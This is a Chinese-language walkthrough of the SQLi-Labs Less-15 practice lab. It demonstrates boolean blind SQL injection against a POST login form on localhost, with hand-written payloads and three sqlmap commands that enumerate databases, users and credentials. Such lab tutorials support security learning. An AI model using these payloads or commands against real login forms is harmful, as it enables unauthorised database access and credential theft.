# Sqli Labs Less-15：POST 注入复现

---

## 一、环境与原理说明

Less-15 是基于 **POST 表单**的**布尔盲注**，核心 SQL 逻辑为：

```SQL

SELECT * FROM users WHERE username='$uname' AND password='$passwd'
```

- 闭合方式：单引号 `'`

- 注入点：`uname` 或 `passwd` 参数

- 盲注判断：页面返回“登录成功”或“登录失败”作为布尔条件

---

## 二、手动盲注测试（理解原理）

1. **测试闭合**

提交 payload：

```Plain Text

uname=admin'&passwd=123456&submit=Submit
```

若页面报错或显示“登录失败”，说明单引号闭合成功。

1. **猜解数据库名长度**

提交 payload：

```Plain Text

uname=admin' and length(database())=8#&passwd=123456&submit=Submit
```

- 若页面显示“登录成功”，说明数据库名长度为 8（sqli-labs 默认数据库为 `security`，长度正好是 8）。

- 若失败，调整数字继续测试。

1. **逐字符猜解数据库名**

以猜解第一个字符为例：

```Plain Text

uname=admin' and ascii(substr(database(),1,1))=115#&passwd=123456&submit=Submit
```

- `115` 是字符 `s` 的 ASCII 码，若登录成功，说明数据库名首字符为 `s`。

- 依次类推，可完整猜解出数据库名 `security`。

---

## 三、sqlmap 自动化注入（三种方式）

### 方式 1：使用 `-r` 读取抓包文件

1. **Burp Suite 抓包**

    - 访问 `http://127.0.0.1/sqli-labs/Less-15/`，输入任意账号密码（如 `test/test`），点击 Submit。

    - 用 Burp Suite 拦截该 POST 请求，将完整请求内容复制保存为 `1.txt`，放在 sqlmap 目录下。

    - 请求内容示例：

        ```HTTP
        
        POST /sqli-labs/Less-15/ HTTP/1.1
        Host: 127.0.0.1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 37
        
        uname=test&passwd=test&submit=Submit
        ```

2. **执行 sqlmap 命令**

    ```Bash
    
    python3 sqlmap.py -r "./1.txt" --batch --dbs --users
    ```

    - `-r`：从文件中读取 HTTP 请求

    - `--batch`：自动选择默认选项，无需交互

    - `--dbs`：枚举所有数据库

    - `--users`：枚举数据库用户

---

### 方式 2：使用 `--data` 指定 POST 数据

直接在命令行中指定 POST 表单数据和目标参数：

```Bash

python3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-15/" \
  --data "uname=test&passwd=test&submit=Submit" \
  -p "uname,passwd" \
  --dbs --users --batch
```

- `--data`：指定 POST 提交的表单参数

- `-p`：指定要测试的注入点（`uname` 和 `passwd`）

---

### 方式 3：使用 `--forms` 自动识别表单

让 sqlmap 自动扫描页面中的表单并进行注入测试：

```Bash

python3 sqlmap.py -u "http://127.0.0.1/sqli-labs/Less-15/" \
  --forms \
  --dbs --users --batch
```

- `--forms`：自动搜索页面中的表单，并对表单参数进行注入测试，无需手动指定 `--data`。

---

## 四、预期结果

执行 sqlmap 后，你将得到：

- 所有数据库：`information_schema`, `security` 等

- 数据库用户：`root@localhost` 等

- 进一步可枚举 `security` 库中的表（如 `users`）和字段（如 `username`, `password`），获取管理员账号密码。
> （注：文档部分内容可能由 AI 生成）